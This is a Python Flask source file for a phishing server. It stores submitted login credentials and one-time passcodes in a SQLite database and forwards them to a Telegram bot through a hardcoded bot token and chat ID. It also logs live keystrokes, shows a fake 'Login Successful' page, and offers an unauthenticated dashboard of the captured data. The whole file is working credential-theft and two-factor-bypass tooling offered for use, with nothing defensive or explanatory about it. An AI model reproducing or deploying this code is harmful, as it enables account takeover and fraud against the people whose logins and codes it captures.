from flask import Flask, request, redirect, render_template, jsonify
import sqlite3
import datetime
import urllib.request
import urllib.parse

app = Flask(__name__)

# --- Telegram Configuration ---
TELEGRAM_TOKEN = "9298781775:AAEwa2f2rkM2dMixFg3nFryGzCkmy5AE9OU"
TELEGRAM_CHAT_ID = "7981882727"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode("utf-8")
    try:
        urllib.request.urlopen(url, data=data)
    except Exception as e:
        print(f"Telegram error: {e}")

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS submissions
                 (id INTEGER PRIMARY KEY, timestamp TEXT, field TEXT, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                 (id INTEGER PRIMARY KEY, timestamp TEXT, field TEXT, value TEXT)''')
    conn.commit()
    conn.close()

init_db()

# --- Routes ---
@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    
    msg = "🚨 **NEW CREDENTIALS CAPTURED** 🚨\n"
    for field, value in request.form.items():
        c.execute("INSERT INTO submissions (timestamp, field, value) VALUES (?, ?, ?)", (timestamp, field, value))
        msg += f"👉 {field.capitalize()}: {value}\n"
        
    conn.commit()
    conn.close()
    
    send_to_telegram(msg)
    print(msg, flush=True)
    return redirect('/otp')

@app.route('/otp', methods=['GET'])
def otp_page():
    return render_template('otp.html')

@app.route('/success', methods=['POST'])
def success():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    otp = request.form.get('otp')
    
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute("INSERT INTO submissions (timestamp, field, value) VALUES (?, ?, ?)", (timestamp, 'otp', otp))
    conn.commit()
    conn.close()
    
    msg = f"🔑 **OTP CAPTURED**: {otp}"
    send_to_telegram(msg)
    print(msg, flush=True)
    return "<h1 style='text-align:center; margin-top:50px; color:#004085;'>Login Successful. Redirecting...</h1>"

@app.route('/log_keystroke', methods=['POST'])
def log_keystroke():
    data = request.json
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute("INSERT INTO keystrokes (timestamp, field, value) VALUES (?, ?, ?)", (timestamp, data.get('field'), data.get('value')))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "success"})

# --- The Secret Dashboard ---
@app.route('/admin_dashboard')
def admin_dashboard():
    conn = sqlite3.connect('captured_data.db')
    c = conn.cursor()
    c.execute("SELECT * FROM submissions ORDER BY id DESC LIMIT 50")
    submissions = c.fetchall()
    c.execute("SELECT * FROM keystrokes ORDER BY id DESC LIMIT 50")
    keystrokes = c.fetchall()
    conn.close()
    
    html = """
    <html><head><title>Admin Dashboard</title>
    <style>
        body { font-family: Arial; padding: 20px; background: #f4f7f6; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 30px; background: white; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #004085; color: white; }
        h2 { color: #333; }
    </style></head><body>
        <h2>Captured Form Submissions</h2>
        <table><tr><th>ID</th><th>Timestamp</th><th>Field</th><th>Value</th></tr>
    """
    for row in submissions:
        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td></tr>"
        
    html += "</table><h2>Live Keystrokes</h2><table><tr><th>ID</th><th>Timestamp</th><th>Field</th><th>Value</th></tr>"
    for row in keystrokes:
        html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td></tr>"
        
    html += "</table></body></html>"
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)